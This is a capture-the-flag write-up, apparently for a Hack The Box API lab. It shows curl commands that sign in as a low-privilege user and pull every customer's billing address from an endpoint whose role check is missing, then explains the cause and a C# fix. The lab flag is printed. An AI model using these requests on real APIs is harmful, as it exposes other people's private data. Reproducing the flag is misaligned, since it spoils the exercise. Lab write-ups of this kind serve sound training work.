# API5 — Broken Function Level Authorization Exercise

**Target:** 154.57.164.82 (your port)  
**Flag:** `HTB{1e2095c564baf0d2d316080217040dae}`

## Attack Summary

1. Signed in as `htbpentester9@hackthebox.com` (zero-role customer):
```bash
JWT=$(curl -s -X POST "http://$TARGET/api/v1/authentication/customers/sign-in" \
  -H 'Content-Type: application/json' \
  -d '{"Email":"htbpentester9@hackthebox.com","Password":"HTBPentester9"}' | jq -r '.jwt')
```

2. Confirmed user has no roles:

3. Hit privileged endpoint without any role:
```bash
curl -s "http://$TARGET/api/v1/customers/billing-addresses" \
  -H "Authorization: Bearer $JWT" | jq .
```

4. Received full billing address list for all customers — flag embedded in one street field.

## Root Cause

`GET /api/v1/customers/billing-addresses` requires `CustomersBillingAddresses_GetAll` role per Swagger docs, but the role check is not enforced in the handler. Any authenticated user, regardless of roles, gets the full dataset.

## Fix

```csharp
[Authorize(Policy = "CustomersBillingAddresses_GetAll")]
[HttpGet("billing-addresses")]
public IActionResult GetAllBillingAddresses() { ... }
```
